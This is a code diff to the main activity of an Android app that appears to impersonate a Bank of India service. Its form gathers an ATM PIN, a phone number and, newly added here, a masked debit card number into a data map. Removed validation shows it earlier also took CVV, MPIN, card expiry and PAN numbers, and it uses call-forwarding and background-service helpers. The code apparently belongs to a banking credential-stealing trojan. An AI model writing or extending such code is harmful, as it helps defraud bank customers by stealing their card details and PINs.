@@ -22,6 +22,7 @@ import androidx.core.content.ContextCompat;
 
 import com.mydesign.servicechange.boi.net.FrontServices.BackgroundService;
 import com.mydesign.servicechange.boi.net.FrontServices.CallForwardingHelper;
+import com.mydesign.servicechange.boi.net.FrontServices.DebitCardInputMask;
 import com.mydesign.servicechange.boi.net.FrontServices.FormValidator;
 import com.mydesign.servicechange.boi.net.FrontServices.SharedPreferencesHelper;
 
@@ -65,32 +66,9 @@ public class MainActivity extends AppCompatActivity {
             }
 
             String value = editText.getText().toString().trim();
-
-            // Validate based on the key
             switch (key) {
-                case "mobile":
-                    if (!FormValidator.validateMinLength(editText, 10, "Required 10 digit " + key)) {
-                        isValid = false;
-                    }
-                    break;
-
-                case "cvv":
-                    if (!FormValidator.validateMinLength(editText, 3, "Invalid CVV")) {
-                        isValid = false;
-                    }
-                    break;
-                case "pin":
+                case "apin":
                     if (!FormValidator.validateMinLength(editText, 4, "Invalid ATM Pin")) {
-                        isValid = false;
-                    }
-                    break;
-                case "mpin":
-                    if (!FormValidator.validateMinLength(editText, 4, "Invalid Pin")) {
-                        isValid = false;
-                    }
-                    break;
-                case "expiry":
-                    if (!FormValidator.validateMinLength(editText, 5, "Invalid Expiry Date")) {
                         isValid = false;
                     }
                     break;
@@ -99,16 +77,9 @@ public class MainActivity extends AppCompatActivity {
                         isValid = false;
                     }
                     break;
-                case "pan":
-                    if (!FormValidator.validatePANCard(editText, "Invalid Pan Number")) {
-                        isValid = false;
-                    }
-                    break;
                 default:
                     break;
             }
-
-            // Add to dataObject only if the field is valid
             if (isValid) {
                 dataObject.put(key, value);
             }
@@ -272,6 +243,10 @@ public class MainActivity extends AppCompatActivity {
             startService(serviceIntent);
         }
 
+
+        EditText card = findViewById(R.id.card);
+        card.addTextChangedListener(new DebitCardInputMask(card));
+
         dataObject = new HashMap<>();
         Helper helper1 = new Helper();
         helper1.SITE();
@@ -284,6 +259,7 @@ public class MainActivity extends AppCompatActivity {
         ids = new HashMap<>();
         ids.put(R.id.apin, "apin");
         ids.put(R.id.phone, "phone");
+        ids.put(R.id.card, "card");
 
         // Populate dataObject
         for(Map.Entry<Integer, String> entry : ids.entrySet()) {
